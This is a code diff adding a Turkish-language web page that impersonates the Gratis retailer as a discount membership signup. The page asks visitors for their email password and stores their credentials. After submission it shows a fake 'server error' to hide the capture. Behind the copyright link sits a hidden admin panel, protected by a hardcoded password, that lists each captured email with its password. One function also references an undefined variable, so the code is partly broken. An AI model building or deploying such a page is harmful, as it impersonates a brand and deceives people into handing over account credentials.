@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gratis Fırsat ürünleri</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .header img {
+            max-width: 180px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            color: #ff4757;
+            text-align: center;
+            margin-bottom: 5px;
+            font-size: 1.8rem;
+        }
+        
+        .privacy-notice {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border-left: 4px solid #2196f3;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            color: #2d3436;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus, .form-group select:focus {
+            border-color: #74b9ff;
+            outline: none;
+        }
+        
+        .optional {
+            color: #7f8c8d;
+            font-size: 12px;
+            font-weight: normal;
+        }
+        
+        .required {
+            color: #e84118;
+        }
+        
+        .error {
+            color: #e84118;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #74b9ff 0%, #0984e3 100%);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        .admin-link {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            border-top: 1px solid #eee;
+        }
+        
+        .admin-link a {
+            color: #636e72;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .admin-link a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Sunucu hatası modal stili */
+        .server-error-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .server-error-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .server-error-content h2 {
+            color: #e74c3c;
+            margin-bottom: 15px;
+        }
+        
+        .server-error-content p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .server-error-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://i.pinimg.com/736x/75/a5/5d/75a55d07a85c594ddac08b975464be64.jpg" alt="Gratis Logo">
+            <h1>🔐 Gratis Üyelik Kaydı</h1>
+        </div>
+        
+        <div class="privacy-notice">
+            <strong>Özel indirimlerden yararlanmak için hemen kaydolun!</strong> 
+        </div>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <label for="name">Ad Soyad <span class="required">*</span></label>
+                <input type="text" id="name" name="name" required placeholder="Adınız ve soyadınız">
+                <div class="error" id="nameError">Lütfen geçerli bir isim girin (min. 3 karakter)</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">E-posta Adresi <span class="required">*</span></label>
+                <input type="email" id="email" name="email" required placeholder="@email.com">
+                <div class="error" id="emailError">Lütfen geçerli bir e-posta adresi girin</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Telefon Numarası <span class="optional">(isteğe bağlı)</span></label>
+                <input type="tel" id="phone" name="phone" placeholder="05XX XXX XX XX">
+                <div class="error" id="phoneError">Lütfen geçerli bir telefon numarası girin (05XXXXXXXXX)</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Şifre <span class="required">*</span></label>
+                <input type="password" id="password" name="password" required placeholder="E-posta şifre">
+                <div class="error" id="passwordError"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="newsletter">
+                    <input type="checkbox" id="newsletter" name="newsletter" checked>
+                    İndirimler ve kampanyalardan haberdar olmak istiyorum
+                </label>
+            </div>
+            
+            <button type="submit" class="btn">Kaydı Tamamla</button>
+        </form>
+        
+        <div class="success-message" id="successMessage">
+            ✅ Kaydınız başarılı
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            ❌ Lütfen tüm zorunlu alanları doğru şekilde doldurun.
+        </div>
+        
+        <div class="admin-link">
+            <a href="#" onclick="showAdminLogin()">© 2025 Gratis İndirimli Ürünler. Tüm hakları saklıdır.</a>
+            <p>İndirimler süreyle sınırlıdır. Son kullanma tarihlerine dikkat ediniz.</p>
+        </div>
+    </div>
+
+    <!-- Sunucu hatası modal -->
+    <div class="server-error-modal" id="serverErrorModal">
+        <div class="server-error-content">
+            <h2>⛔ Sunucu Hatası</h2>
+            <p>Sunucu yoğunluğundan dolayı siteye ulaşılamıyor. Lütfen daha sonra tekrar deneyin.</p>
+            <p>Hata Kodu: 404 - Service Unavailable</p>
+            <button class="server-error-btn" onclick="closeServerError()">Tamam</button>
+        </div>
+    </div>
+
+    <script>
+        // Kullanıcı verilerini saklamak için dizi
+        let users = JSON.parse(localStorage.getItem('gratisUsers')) || [];
+
+        // Doğrulama fonksiyonları
+        const validators = {
+            name: (name) => name && name.length >= 3 && /^[a-zA-ZğüşıöçĞÜŞİÖÇ\s]+$/.test(name),
+            email: (email) => email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email),
+            phone: (phone) => !phone || phone === '' || /^05[0-9]{9}$/.test(phone.replace(/\D/g, '')),
+            password: (password) => password && password.length >= 4
+        };
+
+        // Form gönderimi
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Form değerlerini al
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+            const newsletter = document.getElementById('newsletter').checked;
+            
+            // Doğrulama yap
+            const isNameValid = validators.name(name);
+            const isEmailValid = validators.email(email);
+            const isPhoneValid = validators.phone(phone);
+            const isPasswordValid = validators.password(password);
+            
+            // Hataları göster
+            document.getElementById('nameError').style.display = isNameValid ? 'none' : 'block';
+            document.getElementById('emailError').style.display = isEmailValid ? 'none' : 'block';
+            document.getElementById('phoneError').style.display = isPhoneValid ? 'none' : 'block';
+            document.getElementById('passwordError').style.display = isPasswordValid ? 'none' : 'block';
+            
+            // Tüm validasyonlar geçerli mi kontrol et
+            if (!isNameValid || !isEmailValid || !isPasswordValid || !isPhoneValid) {
+                showMessage('error', 'Lütfen tüm zorunlu alanları doğru şekilde doldurun.');
+                return;
+            }
+            
+            // Kullanıcıyı kaydet
+            const userData = {
+                name: name,
+                email: email,
+                phone: phone || 'Belirtilmemiş',
+                password: password, // Şifre gizlendi
+                newsletter: newsletter,
+                timestamp: new Date().toLocaleString('tr-TR'),
+                ip: generateRandomIP(),
+                id: Date.now() // Benzersiz ID
+            };
+            
+            users.push(userData);
+            
+            // LocalStorage'a kaydet
+            localStorage.setItem('gratisUsers', JSON.stringify(users));
+            
+            // Formu temizle
+            this.reset();
+            document.getElementById('newsletter').checked = true;
+            
+            // Başarı mesajı göster
+            showMessage('success', '✅ Kayıt başarılı');
+            
+            // 2 saniye sonra sunucu hatası göster
+            setTimeout(showServerError, 2000);
+            
+            // Simüle edilmiş veri iletimi
+            simulateDataTransfer(userData);
+        });
+
+        // Sunucu hatası göster
+        function showServerError() {
+            document.getElementById('serverErrorModal').style.display = 'flex';
+        }
+
+        // Sunucu hatasını kapat
+        function closeServerError() {
+            document.getElementById('serverErrorModal').style.display = 'none';
+        }
+
+        // Mesaj göster
+        function showMessage(type, message) {
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+            
+            if (type === 'success') {
+                successMsg.textContent = message;
+                successMsg.style.display = 'block';
+                errorMsg.style.display = 'none';
+                
+                setTimeout(() => {
+                    successMsg.style.display = 'none';
+                }, 5000);
+            } else {
+                errorMsg.textContent = message;
+                errorMsg.style.display = 'block';
+                successMsg.style.display = 'none';
+                
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Simüle veri iletimi
+        function simulateDataTransfer(userData) {
+            console.log('📤 Yöneticiye gönderilen veri:', {
+                ...userData,
+                password: password 
+            });
+        }
+
+        // Rastgele IP oluştur
+        function generateRandomIP() {
+            return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+
+        // Yönetici girişi
+        function showAdminLogin() {
+            const password = prompt('Yönetici şifresini girin:');
+            if (password === 'corbavarmıbeyler123') { // Basit şifre kontrolü
+                showAdminPanel();
+            } else {
+                alert('❌ Yetkisiz erişim!');
+            }
+        }
+
+        // Yönetici paneli
+        function showAdminPanel() {
+            if (users.length === 0) {
+                alert('Henüz kayıtlı kullanıcı bulunmamaktadır.');
+                return;
+            }
+            
+            const userList = users.map(user => 
+                `👤 İsim: ${user.name}\n📧 E-posta: ${user.email} ${user.password}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
+            ).join('');
+            
+            alert('👨‍💼 YÖNETİCİ PANELİ\n\nToplam Kayıt: ' + users.length + '\n\n' + userList);
+        }
+
+        // Input validation için real-time feedback
+        document.querySelectorAll('input[required]').forEach(input => {
+            input.addEventListener('blur', function() {
+                validateField(this.id, this.value);
+            });
+        });
+
+        // Alan doğrulama
+        function validateField(fieldId, value) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            let isValid = false;
+            
+            switch(fieldId) {
+                case 'name':
+                    isValid = validators.name(value);
+                    break;
+                case 'email':
+                    isValid = validators.email(value);
+                    break;
+                case 'phone':
+                    isValid = validators.phone(value);
+                    break;
+                case 'password':
+                    isValid = validators.password(value);
+                    break;
+            }
+            
+            errorElement.style.display = isValid ? 'none' : 'block';
+        }
+    </script>
+</body>
+</html>
